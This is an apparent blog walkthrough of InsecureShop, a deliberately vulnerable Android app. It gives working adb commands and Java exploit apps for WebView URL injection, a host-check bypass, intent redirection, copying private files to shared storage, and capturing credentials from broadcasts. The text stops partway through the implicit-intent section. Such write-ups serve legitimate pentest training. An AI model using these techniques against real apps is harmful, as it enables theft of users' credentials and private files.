---
title: Walkthrough of The InsecureShop Android Vulnerable Application 
author: Muhammad Adel
date: 2024-09-06 16:40:00 +0200
categories: [Android Security]
tags: [android security, writeups]
---

## **Introduction**

InsecureShop is an Android application that is designed to be intentionally vulnerable. The application serves as a platform to test your Android pentesting skills. The vulnerabilities present in this app are real and have been found during mobile pentests.

![image.png](/assets/InsecureShop/intro.png)

Peace be upon all of you, on this writeup I am going to cover all the solutions for all the InsecureShop challenges. Each vulnerability is dissected step by step, with detailed explanations providing insights into both the security flaws and the thought processes behind each exploit.


## **Hardcoded Credentials**

> **Description:** Credentials are hardcoded somewhere that can be used to login to the application

The first page of the application indicates that there is only a login page, without any other ways to register your account on the application.

![image.png](/assets/InsecureShop/image.png)

As The name of the first challenge suggests, there should be hard coded creds on the app code, Going through the application classes, let’s check the login activity:

![image.png](/assets/InsecureShop/image%201.png)

Reading the code, the `verifyUserNamePassword` should grab our attention as the application is getting the user input and comparing it to this function. Let’s double-click on it and check it out. It will take us to the Utils Class `com.insecureshop.util.Util` which clearly contains the required creds to login.

![image.png](/assets/InsecureShop/image%202.png)

```text
shopuser:!ns3csh0p
```

And we are logged in:

![image.png](/assets/InsecureShop/image%203.png)

## **Insecure Logging**

> **Description:** User credentials are leaked in logcat. Only attackers with physical access to the device can access this information.

Searching with Jadx-GUI for the `Log.d` function, we will find:

![image.png](/assets/InsecureShop/image%204.png)

The username and password are being logged while accessing the `loginActivity`. So, any username and password that are written while logging in the application will be logged. Let’s exploit this behavior:

```powershell
root@generic_x86:/ $ logcat | grep -e 'userName' -e 'password'
08-31 13:38:33.148 27053 27053 D userName: aa
08-31 13:38:33.148 27053 27053 D password: aa,
08-31 13:38:34.066 27053 27053 D userName: aa
08-31 13:38:34.066 27053 27053 D password: aa,
08-31 13:38:34.199 27053 27053 D userName: aa
08-31 13:38:34.199 27053 27053 D password: aa,
```

![image.png](/assets/InsecureShop/image%205.png)

## **Enabled Insecure Data Storage**

> **Description:** The app stores user credentials locally without encrypting them.

If we looked again at the code of the `LoginActivity` we will notice that the username and password of the application are being saved in the application Prefs file.

```java
public final void onLogin(View view) {
        if (Util.INSTANCE.verifyUserNamePassword(username, password)) {
            // defining the Prefs
            Prefs prefs = Prefs.INSTANCE;
            Context applicationContext = getApplicationContext();
            Intrinsics.checkExpressionValueIsNotNull(applicationContext, "applicationContext");
            // Adding the username to the Prefs
            prefs.getInstance(applicationContext).setUsername(username);
            Prefs prefs2 = Prefs.INSTANCE;
            Context applicationContext2 = getApplicationContext();
            Intrinsics.checkExpressionValueIsNotNull(applicationContext2, "applicationContext");
            // Adding the password to the Prefs
            prefs2.getInstance(applicationContext2).setPassword(password);
            Util.saveProductList$default(Util.INSTANCE, this, null, 2, null);
            startActivity(new Intent(this, ProductListActivity.class));
            return;
        }
}
```

This means that we will find the username and password stored locally in the application `sharedpreferences` folder.

```bash
PS C:\Users\Muhammad> adb shell
root@generic_x86:/ $ cd /data/data/com.insecureshop
root@generic_x86:/data/data/com.insecureshop $ ls
app_webview
cache
code_cache
shared_prefs
root@generic_x86:/data/data/com.insecureshop/ $ cd shared_prefs/                                                               <
root@generic_x86:/data/data/com.insecureshop/shared_prefs $ ls
Prefs.xml
WebViewChromiumPrefs.xml
root@generic_x86:/data/data/com.insecureshop/shared_prefs $ cat Prefs.xml                                                                  <
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="username">shopuser</string>
    <string name="productList">[{&quot;id&quot;:1,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/7974/pexels-photo.jpg&quot;,&quot;name&quot;:&quot;Laptop&quot;,&quot;price&quot;:&quot;80&quot;,&quot;qty&quot;:0,&quot;rating&quot;:1,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:2,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&quot;,&quot;name&quot;:&quot;Hat&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:3,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&quot;,&quot;name&quot;:&quot;Sunglasses&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:4,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&quot;,&quot;name&quot;:&quot;Watch&quot;,&quot;price&quot;:&quot;30&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:5,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&quot;,&quot;name&quot;:&quot;Camera&quot;,&quot;price&quot;:&quot;40&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:6,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&quot;,&quot;name&quot;:&quot;Perfumes&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:7,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&quot;,&quot;name&quot;:&quot;Bagpack&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:8,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&quot;,&quot;name&quot;:&quot;Jacket&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;}]</string>
    <string name="password">!ns3csh0p</string>
</map>
```

## **Insufficient URL Validation**

> **Description:** Possible to load any arbitrary URL in WebView via Deep link.

Loading a WebView inside the application may be hardcoded in the app, or the URI that will load may be given as a parameter from an intent, as in our example here. We have in the `AndroidManifest.xml` the `WebViewActivity`:

```xml
<activity android:name="com.insecureshop.WebViewActivity">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="insecureshop" android:host="com.insecureshop"/>
            </intent-filter>
        </activity> 
```

Let’s examine the actual code of the `WebViewActivity` class:

```java
public final class WebViewActivity extends AppCompatActivity {
// ...........some code truncated............. 
    @Override
    public void onCreate(Bundle savedInstanceState) {
            // ...........some code truncated............. 
        Intent intent = getIntent();
        Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
        Uri uri = intent.getData();
        if (uri != null) {
            String data = null;
            data = null;
            // ...........some code truncated............. 
            // Checking if the Path of the URL contains "/web"
            if (StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)) {
                Intent intent2 = getIntent();
                Intrinsics.checkExpressionValueIsNotNull(intent2, "intent");
                Uri data2 = intent2.getData();
                if (data2 != null) {
                    data = data2.getQueryParameter("url");
                }
            }
            // ...........some code truncated............. 
            if (data == null) {
                finish();
            }
            webview.loadUrl(data);
            Prefs.INSTANCE.getInstance(this).setData(data);
        }
    }
}
```

Let’s examine our code to know what it is doing:

- Getting the Intent Data and store it on a URI Object.
- If the Path of the URL contains "/web", It will take the value of the URL parameter `?url=` and store it in the variable `data`
- At the end, it loads the WebView of the variable data if it’s not null `webview.loadUrl(data);`.

By examining the code, we observed:

- The Intent used here is an implicit intent, cause it receives the data from any app.
- The specified intent data are only the `android:scheme` and `android:host` as indicated in the android manifest file.
- Any value will be passed to the URL parameter `?url=` will be loaded via a WebView. Without any validation on the URL.

Let’s Craft our exploit.

```bash
# Scheme: insecureshop
# host: com.insecureshop
# Path: /web/
# Parameter: ?url=
root@generic_x86:/ $ am start -a android.intent.action.VIEW -d insecureshop://com.insecureshop/web?url=https://itsfading.github.io
Starting: Intent { act=android.intent.action.VIEW dat=insecureshop://com.insecureshop/web?url=https://itsfading.github.io }
```

![image.png](/assets/InsecureShop/image%206.png)

## **Weak Host Validation Check**

> **Description:** Possible to bypass host validation check to load any arbitrary URL in WebView.

This challenge is similar to the previous one, but it wants us to bypass the host validation check. The `WebViewActivity` class contains two conditions: the first one checks if the path of the URL contains `/web` and the second case checks if it contains `webview` :

```java

public final class WebViewActivity extends AppCompatActivity {
  // ...........some code truncated.............
    @Override 
    public void onCreate(Bundle savedInstanceState) {
      // ...........some code truncated.............
        Intent intent = getIntent();
        Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
        Uri uri = intent.getData();
        if (uri != null) {
            String data = null;
            data = null;
            }
             // ...........some code truncated............. 
            // Checking if the Path of the URL contains "/webview"
            else if (StringsKt.equals$default(uri.getPath(), "/webview", false, 2, null)) {
                Intent intent3 = getIntent();
                Intrinsics.checkExpressionValueIsNotNull(intent3, "intent");
                Uri data3 = intent3.getData();
                if (data3 == null) {
                    Intrinsics.throwNpe();
                }
                String queryParameter = data3.getQueryParameter("url");
                if (queryParameter == null) {
                    Intrinsics.throwNpe();
                }
                Intrinsics.checkExpressionValueIsNotNull(queryParameter, "intent.data!!.getQueryParameter(\"url\")!!");
                if (StringsKt.endsWith$default(queryParameter, "insecureshopapp.com", false, 2, (Object) null)) {
                    Intent intent4 = getIntent();
                    Intrinsics.checkExpressionValueIsNotNull(intent4, "intent");
                    Uri data4 = intent4.getData();
                    if (data4 != null) {
                        data = data4.getQueryParameter("url");
                    }
                }
            }
            if (data == null) {
                finish();
            }
            webview.loadUrl(data);
            Prefs.INSTANCE.getInstance(this).setData(data);
        }
    }
}
```

Let’s examine our code to know what it is doing:

- Getting the Intent Data and storing it on a URI Object.
- Checking If the Path of the URL contains `/webview`.
- Checking If the passed data from the intent contains a `?url=` parameter and its value is not empty.
- Checking If the `?url=` query parameter value ends with `insecureshopapp.com`.
- Lastly, it will take the value of the URL parameter `?url=` and store it in the variable `data4` .
- At the end, it loads a WebView of the variable data if it’s not null `webview.loadUrl(data);` .

By examining the code, we observed:

- The new code prevents the user from loading any URL other than `"insecureshopapp.com"`. So it checks if the URL query parameter value ends with it.
- but we can bypass that easily by just adding the fragment `#` and URL encode it. This will bypass the `endwith` function check and load the desired URL.

Let’s Craft our exploit:

```bash
# Scheme: insecureshop
# Host: com.insecureshop
# Path: /webview/
# Parameter: ?url=
root@generic_x86:/ $ am start -a android.intent.action.VIEW -d insecureshop://com.insecureshop/webview?url=https://itsfading.github.io%23insecureshopapp.com
Starting: Intent { act=android.intent.action.VIEW dat=insecureshop://com.insecureshop/webview?url=https://itsfading.github.io#insecureshopapp.com }
```

![image.png](/assets/InsecureShop/image%207.png)

## **Access to Protected Components ( Intent Redirection )**

> **Description:** The app takes an embedded Intent and passes it to method like `startActivity`. This allows any third party app to launch any protected component.

As the challenge description suggests, there should be an intent being passed to the `startActivity ` Function. I have searched through the code, and this one on the `com.insecureshop.WebView2Activity` caught my eye:

![image.png](/assets/InsecureShop/image%208.png)

Let’s review the code:

```java
   public void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState);
        setContentView(C0893R.layout.activity_webview);
        setSupportActionBar((Toolbar) _$_findCachedViewById(C0893R.C0896id.toolbar));
        setTitle(getString(C0893R.string.webview));
        Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
        if (extraIntent != null) {
            startActivity(extraIntent);
            finish();
            return;
        }
```

Here is, the code is waiting to receive an Intent with the key `extra_intent` but the dangerous part here is that the received intent is being passed to the `startActivity` function, which will allow us to access any intent in the application even if it is not exported. Let’s search for an activity like that in our app:

```xml
<activity android:name="com.insecureshop.PrivateActivity" android:exported="false"/>
```

```java
    public void onCreate(Bundle savedInstanceState) {
        String data = getIntent().getStringExtra("url");
        if (data == null) {
            data = "https://www.insecureshopapp.com"; 
        }
        webview.loadUrl(data);
        Prefs.INSTANCE.getInstance(this).setData(data);
    }
```

Here is, the `PrivateActivity` is an unexported activity that cannot be accessed directly, so we can exploit the vulnerability that arises in the `WebView2Activity` to access it. We have two ways to exploit it, using the ADB AM or by creating an exploit application. Unfortunately, I have tried a lot with the am command, but I couldn’t figure out the correct command. So let’s create an exploit app. I will create an app with an empty activity through Android Studio and add the following code:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button IntentButton = (Button) findViewById(R.id.IntentButton);
        // Set a click listener to send the intent
        IntentButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
            // Making an Intent to the PrivateActivity with the extra "url"
                Intent privateActivityIntent = new Intent();
                privateActivityIntent.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity");
                privateActivityIntent.putExtra("url", "https://itsfading.github.io");

            // Passing the whole intent to the extra_intent So we trigger the startActivity in the WebView2Activity class
                Intent webViewIntent = new Intent();
                webViewIntent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
                webViewIntent.putExtra("extra_intent", privateActivityIntent); 
                startActivity(webViewIntent);
            }
        });
    }
}
```

![image.png](/assets/InsecureShop/image%209.png)

Once the button is clicked, the URL will be launched, indicating the access of the `privateActivity` Intent.

## **Unprotected Data URIs**

> **Description:** The untrusted URI's passed via `loadUrl` method allows attackers to pass arbitrary URL in webview.

This challenge is similar to others, as we have an implicit intent in the `com.insecureshop.WebView2Activity` that is exported. But this time it takes any value from us and tries to load it with WebView and that means we can access internal files also.

```java
        Intent intent = getIntent();
        Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
        String dataString = intent.getDataString();
        if (!(dataString == null || StringsKt.isBlank(dataString))) {
            Intent intent2 = getIntent();
            Intrinsics.checkExpressionValueIsNotNull(intent2, "intent");
            webview.loadUrl(intent2.getDataString());
            return;
        }
```

Let’s call the Intent:

```powershell
PS C:\Users\Muhammad> adb shell  am start -n com.insecureshop/.WebView2Activity -d https://itsfading.github.io
Starting: Intent { dat=https://itsfading.github.io/... cmp=com.insecureshop/.WebView2Activity }
PS C:\Users\Muhammad> adb shell  am start -n com.insecureshop/.WebView2Activity -d file:///data/data/com.insecureshop/shared_prefs/Prefs.xml 
Starting: Intent { dat=file:///data/data/com.insecureshop/shared_prefs/Prefs.xml cmp=com.insecureshop/.WebView2Activity }
```

![image.png](/assets/InsecureShop/image%2010.png)

## **Theft of Arbitrary Files**

> **Description:** Possible to steal files from app's local storage via ChooserActivity.

Let’s review the code of the `ChooserActivity`.

```java
public final class ChooserActivity extends AppCompatActivity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0893R.layout.activity_chooser);
        Intent intent = getIntent();
        Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
        if (intent.getExtras() != null) {
            Parcelable parcelableExtra = getIntent().getParcelableExtra("android.intent.extra.STREAM");
            if (parcelableExtra != null) {
                Uri uri = Uri.fromFile(new File(((Uri) parcelableExtra).toString()));
                Intrinsics.checkExpressionValueIsNotNull(uri, "Uri.fromFile(File(uri.toString()))");
                makeTempCopy(uri, getFilename(uri));
                return;
            }
            throw new TypeCastException("null cannot be cast to non-null type android.net.Uri");
        }
    }

    private final Uri makeTempCopy(Uri fileUri, String original_filename) {
        try {
            StringBuilder sb = new StringBuilder();
            File externalStorageDirectory = Environment.getExternalStorageDirectory();
            Intrinsics.checkExpressionValueIsNotNull(externalStorageDirectory, "Environment.getExternalStorageDirectory()");
            sb.append(externalStorageDirectory.getAbsolutePath());
            sb.append(File.separator);
            sb.append("insecureshop");
            String path = sb.toString();
            File directory = new File(path);
            if (!directory.exists()) {
                directory.mkdirs();
            }
            File fileTemp = new File(path, original_filename);
            fileTemp.createNewFile();
            Uri fromFile = Uri.fromFile(fileTemp);
            InputStream openInputStream = getContentResolver().openInputStream(fileUri);
            OutputStream openOutputStream = getContentResolver().openOutputStream(fromFile);
            byte[] bArr = new byte[8192];
            while (true) {
                Integer len = openInputStream != null ? Integer.valueOf(openInputStream.read(bArr)) : null;
                if (len != null && len.intValue() == -1) {
                }
                if (len != null) {
                    int it = len.intValue();
                    if (openOutputStream != null) {
                        openOutputStream.write(bArr, 0, it);
                    }
                }
            }
        } catch (Exception e) {
            return null;
        }
    }

    public final String getFilename(Uri uri) {
        Intrinsics.checkParameterIsNotNull(uri, "uri");
        String fileName = null;
        Context context = getApplicationContext();
        String scheme = uri.getScheme();
        if (Intrinsics.areEqual(scheme, "file")) {
            return uri.getLastPathSegment();
        }
        if (!Intrinsics.areEqual(scheme, "content")) {
            return fileName;
        }
        Intrinsics.checkExpressionValueIsNotNull(context, "context");
        Cursor cursor = context.getContentResolver().query(uri, new String[]{"_display_name"}, null, null, null);
        if (cursor == null || cursor.getCount() == 0) {
            return fileName;
        }
        int columnIndex = cursor.getColumnIndexOrThrow("_display_name");
        cursor.moveToFirst();
        return cursor.getString(columnIndex);
    }
}
```

The code is a bit long but let’s break it down, beginning with the Intent:

- checks if the intent has extras and specifically looks for an extra with the key `android.intent.extra.STREAM`.
- **`Parcelable parcelableExtra = getIntent().getParcelableExtra("android.intent.extra.STREAM")`**:  Retrieves a Parcelable extra from the intent with the key `android.intent.extra.STREAM`. This is typically used to pass complex data between components.
- **`Uri uri = Uri.fromFile(new File(((Uri) parcelableExtra).toString()))`**: Converts the Parcelable object (which should be a `Uri`) into a `File` object and then creates a `Uri` from that file. This line assumes that the Parcelable extra is a `Uri` that represents a file path.
- Creates a temporary copy of the file, and handles it using `makeTempCopy`.

Moving to the **`makeTempCopy()` :**

- Creates a temporary copy of the file specified by the `Uri`.
- It reads the content of the original file and writes it to a new file in the external storage directory (`/sdcard/insecureshop/`).

Moving to the **`getFilename()`:**

- This method determines the filename from a `Uri`.

Based upon the above information, let’s create an exploit app with following code to seal a copy from the `Prefs.xml` file as an example:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button TheftofArbitraryFilesButton = (Button) findViewById(R.id.TheftofArbitraryFiles);

        // Set a click listener to send the intent
        TheftofArbitraryFilesButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent StealingFile = new Intent();
                // Selecting the ChooserActivity
                StealingFile.setClassName("com.insecureshop", "com.insecureshop.ChooserActivity");
                // Specfiying the Prefs.xml file
                Uri FileName = Uri.parse("/data/data/com.insecureshop/shared_prefs/Prefs.xml");
                // adding the EXTRA_STREAM as an extra to trigger the exported Intent
                StealingFile.putExtra(StealingFile.EXTRA_STREAM, FileName);
                // Starting the Intent
                startActivity(StealingFile);
            }
        });
    }
}
```

Let’s Install the application:

![image.png](/assets/InsecureShop/image%2011.png)

Clicking the button and checking the SDCARD files if we were able to steal the `Prefs.xml` file.

```bash
root@generic_x86:/data/local/tmp $ cd /sdcard/
root@generic_x86:/data/local/tmp $ ls
Alarms/         Download/       Notifications/  Ringtones/
Android/        Movies/         Pictures/       insecureshop/
DCIM/           Music/          Podcasts/
root@generic_x86:/sdcard/insecureshop $ ls -la
-rw-rw---- root     sdcard_rw     2539 2024-08-29 14:41 Prefs.xml
root@generic_x86:/sdcard/insecureshop $ cat Prefs.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="username">shopuser</string>
    <string name="password">!ns3csh0p</string>
    <string name="productList">[{&quot;id&quot;:1,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/7974/pexels-photo.jpg&quot;,&quot;name&quot;:&quot;Laptop&quot;,&quot;price&quot;:&quot;80&quot;,&quot;qty&quot;:0,&quot;rating&quot;:1,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:2,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&quot;,&quot;name&quot;:&quot;Hat&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:3,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&quot;,&quot;name&quot;:&quot;Sunglasses&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:4,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&quot;,&quot;name&quot;:&quot;Watch&quot;,&quot;price&quot;:&quot;30&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:5,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&quot;,&quot;name&quot;:&quot;Camera&quot;,&quot;price&quot;:&quot;40&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:6,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&quot;,&quot;name&quot;:&quot;Perfumes&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:7,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&quot;,&quot;name&quot;:&quot;Bagpack&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:8,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&quot;,&quot;name&quot;:&quot;Jacket&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;}]</string>
    <string name="data">https://itsfading.github.io</string>
</map>
```

Great, we can now steal any file from the application directory and make a copy of it.

## **Insecure Broadcast Receiver**

> **Description:** An exported activity registers a broadcast during `onCreate` method execution. An attacker can trigger this broadcast and provide arbitrary URL in `'web_url'` parameter.

While reviewing the classes, I found that there is a class named `com.insecureshop.CustomReceiver` which has a new receiver being initiated along with the `onRecive` method:

```java
public final class CustomReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Bundle extras;
        String stringExtra = (intent == null || (extras = intent.getExtras()) == null) ? null : extras.getString("web_url");
        String str = stringExtra;
        if (!(str == null || StringsKt.isBlank(str))) {
            Intent intent2 = new Intent(context, WebView2Activity.class);
            intent2.putExtra("url", stringExtra);
            if (context != null) {
                context.startActivity(intent2);
            }
        }
    }
```

Here, the `onRecive` method is defining what will happen when a broadcast Intent/message is received. It will look for a key `web_url` and the value for it will be passed to the `WebView2Activity` to display this URL. But to trigger this broadcast, we first need to search where this custom receiver is being used. A quick search will reveal that `com.insecureshop.AboutUsActivity` is using it. Let’s examine its code:

```java
public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0893R.layout.activity_about_us);
        // Custom receiver object created
        CustomReceiver customReceiver = new CustomReceiver();
        this.receiver = customReceiver;
        if (customReceiver == null) {
            Intrinsics.throwUninitializedPropertyAccessException("receiver");
        }
        // registering the reciever with a specific Intent
        registerReceiver(customReceiver, new IntentFilter("com.insecureshop.CUSTOM_INTENT"));
    }

    @Override
    public void onDestroy() {
        CustomReceiver customReceiver = this.receiver;
        if (customReceiver == null) {
            Intrinsics.throwUninitializedPropertyAccessException("receiver");
        }
        unregisterReceiver(customReceiver);
        super.onDestroy();
    }
```

Let’s break it down:

- **`CustomReceiver customReceiver = new CustomReceiver();`**: This creates an instance of `CustomReceiver`, which is a custom class extending `BroadcastReceiver`.
- **`registerReceiver(customReceiver, new IntentFilter("com.insecureshop.CUSTOM_INTENT"));`**: This registers the `customReceiver` to listen for broadcasts with the action `"com.insecureshop.CUSTOM_INTENT"`. The `IntentFilter` specifies the action that the receiver should respond to. When an `Intent` with this action is broadcasted, the `onReceive` method of `CustomReceiver` will be triggered.
- **`onDestroy()`**: This method is called when the activity is about to be destroyed. It is typically used to clean up resources.

One thing to note here, as many writeups getting it wrong, the `AboutUsActivity` is exported in `AndroidManifest.xml` 

```xml
<activity android:name="com.insecureshop.AboutUsActivity" android:exported="true"/> 
```

But that does not directly impact the ability of another application to trigger the broadcast receiver because we have two types of broadcast receivers:

- **Statically Registered Receiver (via Manifest)**:  A receiver declared in the manifest with `<receiver>` can be exported to allow other apps to send broadcasts to it. If `android:exported="false"` is set in the manifest, only the app itself can trigger the receiver.
- **Dynamically Registered Receiver**:  When you register a receiver dynamically in your activity (using `registerReceiver()`), it only exists while the activity is running.  It can receive broadcasts sent by `sendBroadcast()` within the same application or by any other application if the receiver is not restricted by permissions. Since it is registered **within the context of the running activity**, it does not need to be exported.

Now, let’s craft our exploit code via the AM command utility:

```powershell
PS C:\Users\Muhammad> adb shell am start -n com.insecureshop/.AboutUsActivity
Starting: Intent { cmp=com.insecureshop/.AboutUsActivity }
Warning: Activity not started, its current task has been brought to the front
PS C:\Users\Muhammad> adb shell am broadcast -a com.insecureshop.CUSTOM_INTENT --es web_url "https://itsfading.github.io"
Broadcasting: Intent { act=com.insecureshop.CUSTOM_INTENT (has extras) }
Broadcast completed: result=0 
```

![image.png](/assets/InsecureShop/image%2012.png)

We can also create an exploit app with the following code:

```java
public class YourActivity extends AppCompatActivity {

    private Context context; // Make sure to initialize this context appropriately
    public void insecureBroadcast(View view) {
        // Create an Intent to start the activity
        Intent intent = new Intent();
        intent.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity");
        startActivity(intent);

        // Delay the broadcast by 1 second
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                delayedBroadcast();
            }
        }, 1000);
    }

    private void delayedBroadcast() {
        // Create an Intent for the broadcast
        Intent WebViewintent = new Intent("com.insecureshop.CUSTOM_INTENT");
        WebViewintent.putExtra("web_url", "https://itsfading.github.io");
        
        // Send the broadcast
        if (context != null) {
            context.sendBroadcast(WebViewintent);
        }
    }
}
```

## **Use of Implicit intent to send a broadcast with sensitive data**

> **Description:** The use of Implicit intent can allow third-party apps to steal credentials.

In the same activity as before, `AboutUsActivity` there is the use of a dynamic broadcast receiver:

```java
 public final void onSendData(View view) {
        Intrinsics.checkParameterIsNotNull(view, "view");
        String userName = Prefs.INSTANCE.getUsername();
        if (userName == null) {
            Intrinsics.throwNpe();
        }
        String password = Prefs.INSTANCE.getPassword();
        if (password == null) {
            Intrinsics.throwNpe();
        }
        Intent intent = new Intent("com.insecureshop.action.BROADCAST");
        intent.putExtra("username", userName);
        intent.putExtra("password", password);
        sendBroadcast(intent);
        TextView textView = (TextView) _$_findCachedViewById(C0893R.C0896id.textView);
        Intrinsics.checkExpressionValueIsNotNull(textView, "textView");
        textView.setText("InsecureShop is an intentionally designed vulnerable android app built in Kotlin.");
    }
```

But this time, only the `sendBroadcast` function is being implemented without `onReceive`. So what we need to do is just receive this broadcast that has the `"com.insecureshop.action.BROADCAST"` intent to get the username and password. Since the `AboutUsActivity` is exported, we can easily trigger it to send the broadcast, then implement a second exploit app to receive the data. And here is my code for the exploit app:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // starting the AboutUs Activity to trigger the sendBroadcast
        Intent triggerBroadCast = new Intent();
        triggerBroadCast.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity");
        startActivity(triggerBroadCast);

       BroadcastReceiver receiver = new BroadcastReceiver() {
           @Override
           // Once a broadcast received with a specific intent
           public void onReceive(Context context, Intent intent) {
                      // Geting the value from the defined extras
                String username = intent.getStringExtra("username");
                String password = intent.getStringExtra("password");
                Log.d("userName: ", username);
                Log.d("password: ", password);
           }
       };
       // Waiting for any broadcast with this intent "com.insecureshop.action.BROADCAST"
       registerReceiver(receiver, new IntentFilter("com.insecureshop.action.BROADCAST"));
    }
}
```

![image.png](/assets/InsecureShop/image%2013.png)

And here, the username and password have been stolen.

## **Intercepting Implicit intent to load arbitrary URL**

> **Description:** The use of Implicit intent can allow third-party apps to load any arbitrary URL in WebView.

Actually, I thought that the challenge was repetitive, as we have already exploited the same scenario to load an arbitrary URL in WebView. So I had to seek the challenge hints to know exactly what it meant.

[Intercepting Implicit intent to load arbitrary URL](https://docs.insecureshopapp.com/insecureshop-challenges/intercepting-implicit-intent-to-load-arbitrary-url)

It refers to the `com.insecureshop.ProductListActivity` it creates an object from the `ProductDetailBroadCast` class:

```java
public final class ProductListActivity extends AppCompatActivity {
    private HashMap _$_findViewCache;
    private final ProductDetailBroadCast productDetailBroadCast = new ProductDetailBroadCast();
    //....................//
    
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // registring the BroadCast Receiver with the "com.insecureshop.action.PRODUCT_DETAIL" Intent
        registerReceiver(this.productDetailBroadCast, new IntentFilter("com.insecureshop.action.PRODUCT_DETAIL"));
}
```

